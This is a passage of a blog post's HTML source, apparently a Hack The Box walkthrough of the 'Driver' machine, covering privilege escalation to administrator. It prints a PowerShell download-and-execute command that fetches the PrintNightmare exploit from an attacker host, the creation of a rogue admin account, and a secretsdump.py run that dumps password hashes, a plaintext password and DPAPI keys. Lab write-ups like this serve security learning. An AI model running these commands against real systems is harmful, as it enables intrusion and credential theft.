class="built_in">cat</span> user.txt</span><br><span class="line">a605c8dc202b75b68359640f43d14212</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2085.jpg"></li>
+</ul>
+<h1 id="root"><a href="#root" class="headerlink" title="root"></a>root</h1><p>by running winpeas, there is a system service running spoolsv which is print spooler service</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2086.jpg"></li>
+</ul>
+<p>exploit as we need local privilege escalation</p>
+<ul>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NhbGVic3Rld2FydC9DVkUtMjAyMS0xNjc1">CVE-2021-1675 - PrintNightmare LPE - PowerShell<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIxLzA3LzA4L3BsYXlpbmctd2l0aC1wcmludG5pZ2h0bWFyZS5odG1s">Playing with PrintNightmare - 0xdf<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+</ul>
+<p>Following the steps gives error that running scripts is disabled.</p>
+<p>For this, getting a meterpreter shell too won’t work, you can import the module but you can’t then run Invoke-Nightmare. The shell will die.</p>
+<h1 id="workaround"><a href="#workaround" class="headerlink" title="workaround"></a>workaround</h1><p>spin a local web server and download it then and it will then import it automatically</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\tony\Desktop&gt; IEX(New-Object Net.Webclient).downloadstring(<span class="string">&#x27;http://10.10.14.18/CVE-2021-1675.ps1&#x27;</span>)</span><br><span class="line">*Evil-WinRM* PS C:\Users\tony\Desktop&gt; Invoke-Nightmare -NewUser <span class="string">&quot;luci&quot;</span> -NewPassword <span class="string">&quot;luci11&quot;</span></span><br><span class="line">[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll</span><br><span class="line">[+] using pDriverPath = <span class="string">&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll&quot;</span></span><br><span class="line">[+] added user luci as <span class="built_in">local</span> administrator</span><br><span class="line">[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll</span><br></pre></td></tr></table></figure>
+
+<p>and we are administrator now:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/driver]</span><br><span class="line">└─<span class="comment"># evil-winrm -i 10.10.11.106 -u luci -p luci11                                                                                  </span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2.4</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\luci\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">driver\luci</span><br><span class="line">*Evil-WinRM* PS C:\Users\luci\Documents&gt; <span class="built_in">cat</span> \Users\Administrator\Desktop\root.txt</span><br><span class="line">d93ef08c4ef67ae0ae771a2048ca6e75</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2087.jpg"></li>
+</ul>
+<p>get administrator’s ntlm hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/driver]</span><br><span class="line">└─<span class="comment"># secretsdump.py luci@10.10.11.106</span></span><br><span class="line">Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password: luci11</span><br><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state</span><br><span class="line">[*] Service RemoteRegistry is disabled, enabling it</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[*] Target system bootKey: 0xe5b3cda034afd685bc69ccd3c4e9387c</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1256cff8b5b5fdb8c327d3b6c3f5017:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">tony:1003:aad3b435b51404eeaad3b435b51404ee:dfdb5b520de42ca5d1b84ce61553d085:::</span><br><span class="line">luci:1004:aad3b435b51404eeaad3b435b51404ee:b7e822b81dec47522161ecad82d1aaef:::</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:<span class="built_in">hash</span>)</span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] DefaultPassword </span><br><span class="line">DRIVER\tony:liltony</span><br><span class="line">[*] DPAPI_SYSTEM </span><br><span class="line">dpapi_machinekey:0x68d8efd1bd3fa3ab206268f0bbc6e2a4a5e4b43e</span><br><span class="line">dpapi_userkey:0x68060403e8f0276a683ad704b45dc7b850d9722f</span><br><span class="line">[*] Cleaning up... </span><br><span class="line">[*] Stopping service RemoteRegistry</span><br><span class="line">[*] Restoring the disabled state <span class="keyword">for</span> service RemoteRegistry</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2088.jpg"></li>
+</ul>
+<h1 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h1><ul>
+<li>SMB Penetration Testing Port 445</li>
+<li>SMB - SCF File Attacks - NetNTLMv2 hash grab by using responder</li>
+<li>ntlmv2 hash cracking using hashcat</li>
+<li>evil-winrm shell usage</li>
+<li>CVE-2021-1675 - PrintNightmare LPE - PowerShell</li>
+<li>using secretsdump.py dumping administrator’s ntlm hash</li>
+</ul>
+<h1 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h1><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/10/03/driver/" title="Hack-The-Box-walkthrough[Driver]">https://fdlucifer.github.io/2021/10/03/driver/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/09/29/bolt/" rel="prev" title="Hack-The-Box-walkthrough[bolt]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[bolt]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/10/19/devzat/" rel="next" title="Hack-The-Box-walkthrough[devzat]">
+                  Hack-The-Box-walkthrough[devzat] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
